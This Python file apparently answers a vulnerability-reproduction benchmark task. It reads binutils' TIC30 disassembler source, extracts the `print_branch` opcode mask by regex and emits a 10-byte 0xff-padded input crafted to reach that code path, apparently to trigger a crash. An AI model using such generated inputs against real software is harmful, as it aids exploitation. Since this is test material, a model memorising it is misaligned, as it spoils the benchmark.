import os
import re
import tarfile
import tempfile
from typing import Optional, Tuple, List


def _strip_c_comments(code: str) -> str:
    out = []
    i = 0
    n = len(code)
    in_line = False
    in_block = False
    in_str = False
    in_chr = False
    esc = False
    while i < n:
        c = code[i]
        nxt = code[i + 1] if i + 1 < n else ""

        if in_line:
            if c == "\n":
                in_line = False
                out.append(c)
            else:
                out.append(" ")
            i += 1
            continue

        if in_block:
            if c == "*" and nxt == "/":
                in_block = False
                out.append("  ")
                i += 2
            else:
                out.append("\n" if c == "\n" else " ")
                i += 1
            continue

        if in_str:
            out.append(c)
            if esc:
                esc = False
            else:
                if c == "\\":
                    esc = True
                elif c == '"':
                    in_str = False
            i += 1
            continue

        if in_chr:
            out.append(c)
            if esc:
                esc = False
            else:
                if c == "\\":
                    esc = True
                elif c == "'":
                    in_chr = False
            i += 1
            continue

        if c == "/" and nxt == "/":
            in_line = True
            out.append("  ")
            i += 2
            continue
        if c == "/" and nxt == "*":
            in_block = True
            out.append("  ")
            i += 2
            continue
        if c == '"':
            in_str = True
            out.append(c)
            i += 1
            continue
        if c == "'":
            in_chr = True
            out.append(c)
            i += 1
            continue

        out.append(c)
        i += 1
    return "".join(out)


def _popcount(x: int) -> int:
    return x.bit_count()


def _find_file_in_tar(src_path: str, target_basename: str) -> Optional[str]:
    try:
        with tarfile.open(src_path, "r:*") as tf:
            best = None
            best_depth = 10**9
            for m in tf.getmembers():
                name = m.name
                if not m.isreg():
                    continue
                if os.path.basename(name) == target_basename:
                    depth = name.count("/")
                    if depth < best_depth:
                        best_depth = depth
                        best = name
            return best
    except Exception:
        return None


def _read_tar_member_text(src_path: str, member_name: str) -> Optional[str]:
    try:
        with tarfile.open(src_path, "r:*") as tf:
            m = tf.getmember(member_name)
            f = tf.extractfile(m)
            if f is None:
                return None
            data = f.read()
            try:
                return data.decode("utf-8", errors="ignore")
            except Exception:
                return data.decode("latin-1", errors="ignore")
    except Exception:
        return None


def _read_from_dir(root: str, target_basename: str) -> Optional[str]:
    best = None
    best_depth = 10**9
    for dirpath, _, filenames in os.walk(root):
        for fn in filenames:
            if fn == target_basename:
                path = os.path.join(dirpath, fn)
                rel = os.path.relpath(path, root)
                depth = rel.count(os.sep)
                if depth < best_depth:
                    best_depth = depth
                    best = path
    if not best:
        return None
    try:
        with open(best, "rb") as f:
            data = f.read()
        try:
            return data.decode("utf-8", errors="ignore")
        except Exception:
            return data.decode("latin-1", errors="ignore")
    except Exception:
        return None


def _detect_insn_width_and_endian(code_nc: str) -> Tuple[int, str]:
    lc = code_nc
    endian = None
    if re.search(r"\bbfd_get[lb]32\b", lc):
        endian = "little" if re.search(r"\bbfd_getl32\b", lc) else "big"
        width = 4
        return width, endian
    if re.search(r"\bbfd_get[lb]16\b", lc):
        endian = "little" if re.search(r"\bbfd_getl16\b", lc) else "big"
        width = 2
        return width, endian

    width = 4
    m = re.search(r"\bbfd_byte\s+\w+\s*\[\s*(\d+)\s*\]", lc)
    if m:
        try:
            w = int(m.group(1))
            if w in (2, 4, 8):
                width = w
        except Exception:
            pass
    if endian is None:
        endian = "little"
    return width, endian


def _extract_branch_mask_value(code_nc: str, width_bits: int) -> Optional[Tuple[int, int]]:
    # Try to find simple patterns near print_branch calls.
    candidates: List[Tuple[int, int, int]] = []

    def add_candidate(mask: int, value: int):
        mask &= (1 << width_bits) - 1
        value &= (1 << width_bits) - 1
        if mask == 0:
            return
        candidates.append((_popcount(mask), mask, value))

    # ((x >> s) & m) == v ... print_branch
    pat_shift = re.compile(
        r"if\s*\(\s*\(\s*\(\s*\w+\s*>>\s*(\d+)\s*\)\s*&\s*(0x[0-9A-Fa-f]+|\d+)\s*\)\s*==\s*(0x[0-9A-Fa-f]+|\d+)\s*\)\s*[^;{}]{0,300}?\bprint_branch\b",
        re.S,
    )
    for m in pat_shift.finditer(code_nc):
        try:
            shift = int(m.group(1), 10)
            mm = int(m.group(2), 0)
            vv = int(m.group(3), 0)
            add_candidate(mm << shift, vv << shift)
        except Exception:
            continue

    # (x & m) == v ... print_branch
    pat_mask = re.compile(
        r"if\s*\(\s*\(\s*\w+\s*&\s*(0x[0-9A-Fa-f]+|\d+)\s*\)\s*==\s*(0x[0-9A-Fa-f]+|\d+)\s*\)\s*[^;{}]{0,300}?\bprint_branch\b",
        re.S,
    )
    for m in pat_mask.finditer(code_nc):
        try:
            mm = int(m.group(1), 0)
            vv = int(m.group(2), 0)
            add_candidate(mm, vv)
        except Exception:
            continue

    # x & m == v ... print_branch (without parentheses)
    pat_mask2 = re.compile(
        r"if\s*\(\s*\w+\s*&\s*(0x[0-9A-Fa-f]+|\d+)\s*==\s*(0x[0-9A-Fa-f]+|\d+)\s*\)\s*[^;{}]{0,300}?\bprint_branch\b",
        re.S,
    )
    for m in pat_mask2.finditer(code_nc):
        try:
            mm = int(m.group(1), 0)
            vv = int(m.group(2), 0)
            add_candidate(mm, vv)
        except Exception:
            continue

    if not candidates:
        return None
    candidates.sort(reverse=True)  # highest popcount first
    _, mask, value = candidates[0]
    return mask, value


class Solution:
    def solve(self, src_path: str) -> bytes:
        target = "tic30-dis.c"
        code = None

        if os.path.isdir(src_path):
            code = _read_from_dir(src_path, target)
        else:
            member = _find_file_in_tar(src_path, target)
            if member:
                code = _read_tar_member_text(src_path, member)

        payload = bytearray(b"\xff" * 10)

        if not code:
            return bytes(payload)

        code_nc = _strip_c_comments(code)
        width, endian = _detect_insn_width_and_endian(code_nc)
        if width not in (1, 2, 4, 8):
            width = 4
        width_bits = width * 8
        if width_bits > 64:
            width_bits = 32
            width = 4

        mv = _extract_branch_mask_value(code_nc, width_bits)
        word_max = (1 << width_bits) - 1
        insn = word_max
        if mv is not None:
            mask, value = mv
            insn = (word_max & (~mask & word_max)) | (value & word_max)

        try:
            insn_bytes = int(insn).to_bytes(width, endian, signed=False)
            payload[0:width] = insn_bytes
        except Exception:
            pass

        return bytes(payload)